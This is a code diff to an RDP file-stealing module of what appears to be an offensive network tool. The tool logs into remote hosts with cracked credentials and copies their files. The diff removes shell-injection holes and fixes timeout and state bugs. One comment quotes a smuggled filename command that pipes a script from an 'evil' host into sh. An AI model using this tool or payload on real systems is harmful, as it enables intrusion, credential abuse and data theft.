@@ -3,12 +3,13 @@ steal_files_rdp.py - This script connects to remote RDP servers using provided c
 """
 
 import os
+import shutil
 import subprocess
 import logging
 import time
 from threading import Timer
 from rich.console import Console
-from shared import SharedData
+from shared import SharedData, settle_for_display
 from logger import Logger
 
 # Configure the logger
@@ -42,8 +43,12 @@ class StealFilesRDP:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("RDP connection attempt interrupted due to orchestrator exit.")
                 return None
-            command = f"xfreerdp /v:{ip} /u:{username} /p:{password} /drive:shared,/mnt/shared"
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            # argv list, never a shell string: `password` comes from the wordlist / credential
+            # pool, and one containing `;` or `$(...)` would otherwise be executed rather than
+            # passed to xfreerdp.
+            command = ["xfreerdp", f"/v:{ip}", f"/u:{username}", f"/p:{password}",
+                       "/drive:shared,/mnt/shared"]
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = process.communicate()
             if process.returncode == 0:
                 logger.info(f"Connected to {ip} via RDP with username {username}")
@@ -87,13 +92,13 @@ class StealFilesRDP:
                 return
             local_file_path = os.path.join(local_dir, os.path.basename(remote_file))
             os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
-            command = f"cp {remote_file} {local_file_path}"
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate()
-            if process.returncode == 0:
-                logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
-            else:
-                logger.error(f"Error downloading file {remote_file}: {stderr.decode()}")
+            # shutil.copy2, not `cp` through a shell. `remote_file` is a filename read off the
+            # TARGET's redirected drive, so it is chosen by the machine being attacked: a file
+            # named `x; curl http://evil/s|sh; #.flag` matched the steal filters and then ran as
+            # root on the Pi. Victim-to-root on the attacking device is the wrong direction for
+            # this tool. The stdlib copy has no shell to inject into and needs no quoting rules.
+            shutil.copy2(remote_file, local_file_path)
+            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
         except Exception as e:
             logger.error(f"Error stealing file {remote_file}: {e}")
 
@@ -104,8 +109,15 @@ class StealFilesRDP:
         try:
             if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                 self.shared_data.bjornorch_status = "StealFilesRDP"
-                # Wait a bit because it's too fast to see the status change
-                time.sleep(5)
+                # Per-run state, reset here rather than only in __init__. These objects are
+                # long-lived singletons built once by orchestrator.load_action, so the flags
+                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
+                # and every later steal on every host broke out immediately and returned
+                # 'failed' — permanently, until the service restarted. Conversely a single
+                # success left *_connected True and disarmed the timeout for good.
+                self.stop_execution = False
+                self.rdp_connected = False
+                settle_for_display(self.shared_data)  # let the panel show this action's name
                 logger.info(f"Stealing files from {ip}:{port}...")
 
                 # Get RDP credentials from the cracked passwords file
@@ -124,15 +136,24 @@ class StealFilesRDP:
                     logger.error(f"No valid credentials found for {ip}. Skipping...")
                     return 'failed'
 
+                # Token this run. timer.cancel() is only reached on the success path, so a failed
+                # steal leaves a live 240s timer behind; without this it would fire midway
+                # through a LATER host's steal and abort it by setting stop_execution.
+                run_token = object()
+                self._run_token = run_token
+
                 def timeout():
                     """
                     Timeout function to stop the execution if no RDP connection is established.
                     """
+                    if getattr(self, '_run_token', None) is not run_token:
+                        return  # a later execute() owns the flags now
                     if not self.rdp_connected:
                         logger.error(f"No RDP connection established within 4 minutes for {ip}. Marking as failed.")
                         self.stop_execution = True
 
                 timer = Timer(240, timeout)  # 4 minutes timeout
+                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
                 timer.start()
 
                 # Attempt to steal files using each credential
